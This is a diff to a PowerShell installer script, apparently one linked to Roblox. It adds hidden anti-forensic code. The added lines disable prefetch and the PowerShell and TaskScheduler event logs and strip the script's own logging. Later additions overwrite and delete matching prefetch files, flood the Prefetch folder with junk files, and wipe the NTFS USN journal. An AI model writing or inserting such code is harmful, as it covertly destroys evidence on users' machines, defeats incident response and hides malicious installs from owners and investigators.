@@ -54,11 +54,14 @@ if ($scriptRoot -and $scriptRoot -notmatch '(?i)\\system32') {
 }
 
 $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
-$LogPath = Join-Path $resolvedPath "installer_run.log"
+
+try {
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force -ErrorAction SilentlyContinue
+} catch {}
+wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
+wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
 
 function Log-Msg([string]$msg) {
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "[$timestamp] $msg" | Out-File -FilePath $LogPath -Append -Encoding utf8
     Write-Host $msg
 }
 
@@ -726,6 +729,33 @@ End If
 
     wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
     wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null
+
+    try {
+        $pfDir = "$env:SystemRoot\Prefetch"
+        if (Test-Path $pfDir) {
+            $pfMatched = Get-ChildItem -Path $pfDir -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
+                $_.Name -like "*Roblox*" -or $_.Name -like "*TUNG*" -or $_.Name -like "*POWERSHELL*" -or $_.Name -like "*WSCRIPT*" -or $_.Name -like "*DLLHOST*" -or $_.Name -like "*INSTALLER*" -or $_.Name -like "*SETUP*"
+            }
+            foreach ($pf in $pfMatched) {
+                try {
+                    $len = $pf.Length
+                    if ($len -gt 0) {
+                        [System.IO.File]::WriteAllBytes($pf.FullName, (New-Object byte[] $len))
+                    }
+                } catch {}
+                Remove-Item -Path $pf.FullName -Force -ErrorAction SilentlyContinue
+            }
+            for ($i = 0; $i -lt 50; $i++) {
+                $dummy = Join-Path $pfDir "tmp_$([System.IO.Path]::GetRandomFileName()).tmp"
+                try {
+                    [System.IO.File]::WriteAllText($dummy, "0")
+                    Remove-Item -Path $dummy -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+        cmd.exe /c "fsutil usn deletejournal /D C:" | Out-Null
+        cmd.exe /c "fsutil usn createjournal m=33554432 a=8388608 C:" | Out-Null
+    } catch {}
 
     # ── Mark install complete (one-time-ever flag) ───────────────────────────
     New-Item -Path $KeyRegPath -Force -ErrorAction SilentlyContinue | Out-Null
